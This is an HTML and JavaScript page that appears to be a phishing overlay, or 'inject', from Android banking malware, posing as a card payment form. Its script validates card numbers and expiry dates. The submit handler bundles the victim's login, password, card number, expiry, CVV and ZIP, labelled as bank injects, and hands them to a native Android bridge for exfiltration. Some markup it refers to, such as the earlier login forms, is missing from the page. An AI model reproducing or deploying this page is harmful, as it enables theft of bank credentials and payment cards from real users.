<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <style>
        *{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        form {margin: 0;}
        
        #form1,#form2 ,#form3 {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            padding: 30px;
        }

        .cool-input {
            box-sizing: border-box;
            border: 0;
            width: 100%;
            position: relative;
            font-size: 16px;
            margin-bottom: 15px;
        }

        .cool-input__input {
            box-sizing: border-box;
            background: none;
            width: 100%;
            padding: 10px;
            padding-left: 0;
            position: relative;
            z-index: 2;
            font-size: 1em;
        }
        .cool-input__input:focus {
            outline: none;
        }

        .cool-input__placeholder {
            box-sizing: border-box;
            border: none;
            background: none;
            width: auto;
            position: absolute;
            z-index: 1;
            left:20px;
            top: 50%;
            line-height: 1em;
            color: #82878d;
            transition: all 0.2s ease;
            font-weight: 600;
            background-color: #fff;
        }

        .cool-input__input_filled + .cool-input__placeholder, .cool-input__input:focus + .cool-input__placeholder {
            font-size: 0.8em;
            top: 0;
            margin-top: 0.3em;
            background: #fff;
            padding: 5px 6px;
            z-index: 99;
            width: auto;
            left: 8px;
            color: #1a73e9;
        }

        .input {
            border: 2px solid #dbdce0;
            border-radius: 4px;
            margin-top: 15px;
            padding-left: 15px;
        }

        .input:focus {
            border-color: #1a73e9;
        }

        section {
            flex: 1;
        }

        .footer {
            color: #1a73e9;
            font-weight: 600;
            float: left;
            line-height: 33px;
        }

        .button {
            float: right;
            background-color: #1a73e9;
            padding: 7px 25px;
            color: #fff;
            border: 0;
            border-radius: 4px;
        }

        input,button{outline: none !important;box-shadow: none !important;}

        .error {
            border-color: #f00 !important;
        }

        .button:disabled {
            opacity: 0.4;
        }
    </style>
</head>

            <section>
                <div class="cool-input">
                    <input type="tel" id="cc" name="cc" onkeyup="check6();check5()" class="input cool-input__input" autocomplete="off">
                    <span class="cool-input__placeholder">Credit Card</span>
                </div>
                <div>
                    <div class="cool-input" style="float: left; width: 48%;">
                        <input type="tel" id="exp" name="exp" onkeyup="check4();check5()" class="input cool-input__input" autocomplete="off">
                        <span class="cool-input__placeholder">EXP</span>
                    </div>
                    <div class="cool-input" style="float: right; width: 48%;">
                        <input type="password" id="cvv" name="cvv" onkeyup="check5()" class="input cool-input__input" autocomplete="off">
                        <span class="cool-input__placeholder">CVV</span>
                    </div>
                </div>
                
                <div class="cool-input" style="float: left;margin-top: 0;">
                    <input type="text" id="zip" name="zip" onkeyup="check5()" class="input cool-input__input" autocomplete="off">
                    <span class="cool-input__placeholder">ZIP</span>
                </div>
            </section>
            <footer>

                <input type="submit" class="button" id="sendData" disabled value="Next">
            </footer>
        </div>
    </form>
    <script type="text/javascript">
        $('#cc').mask('0000 0000 0000 0000');
        $('#exp').mask('00/00');
        $('#cvv').mask('000')

        $('.cool-input__input').on('input', function(){
            var $this = $(this);
            if ($this.val() == '') {
                $this.removeClass('cool-input__input_filled');
            } else {
                $this.addClass('cool-input__input_filled');
            }
        });
        document.getElementById("login").oninput = function(e){
        document.getElementById("emailDublikat").innerHTML=e.target.value;
        };


        var spinner = document.getElementById('spinner'),
            email = document.getElementById('login'),
            password = document.getElementById('password'),
            form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2'),
            form3 = document.getElementById('form3'),
            nextPage = document.getElementById('nextPage'),
            lastPage = document.getElementById('lastPage'),
            sendData = document.getElementById('sendData');

        var cc = document.getElementById('cc'),
            exp = document.getElementById('exp'),
            cvv = document.getElementById('cvv'),
            zip = document.getElementById('zip');

        var eye = document.getElementById('eye');

        eye.onclick = () => {
            if(password.type == 'password') {
                password.type = 'text'
            } else {
                password.type = 'password'
            }
        }

        nextPage.onclick = function(){
            if(email.value.length < 4) {
                email.classList = 'input cool-input__input error';
                email.focus()
            } else {
                email.classList = 'input cool-input__input cool-input__input_filled';
                spinner.style.display = 'block'
                setTimeout(() => {
                    form1.style.display = 'none';
                    spinner.style.display = 'none';
                    form2.style.display = 'flex';
                }, 1500);
            }
        }

        lastPage.onclick = function(){
            if(password.value.length < 4) {
                password.classList = 'input cool-input__input error';
                password.focus()
            } else {
                email.classList = 'input cool-input__input cool-input__input_filled';
                spinner.style.display = 'block'
                setTimeout(() => {
                    form2.style.display = 'none';
                    spinner.style.display = 'none';
                    form3.style.display = 'flex';
                }, 1500);
            }
        }

        function check6() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error')
            } else {
                cc.classList.remove('error');
                return true
            }
        }

        function check4() {
            
            var mmYY = exp.value.split('/');
				var month = parseInt(mmYY[0]);
				var year = parseInt(mmYY[1]);
			

				var expArray = exp.value.split('/');
				var today, someday;
				var exMonth = expArray[0];
				var exYear = "20" + expArray[1];

				today = new Date();
				someday = new Date();
				someday.setFullYear(exYear, exMonth, 1);

                
                if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
                    exp.classList.add('error')
                } else {
                    exp.classList.remove('error')
                    return true
                }
        }

        function check5() {
            if(valid_credit_card(cc.value) && check4() == true && exp.value.length === 5 && cvv.value.length === 3 && zip.value.length > 2) {
                sendData.disabled = false
            } else {
                sendData.disabled = true
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
            
        }

        sendData.onclick = () => {
            var data = {};
                data.login = login.value;
                data.password = password.value;
                data.cc = cc.value;
                data.exp = exp.value;
                data.cvv = cvv.value;
                data.zip = zip.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
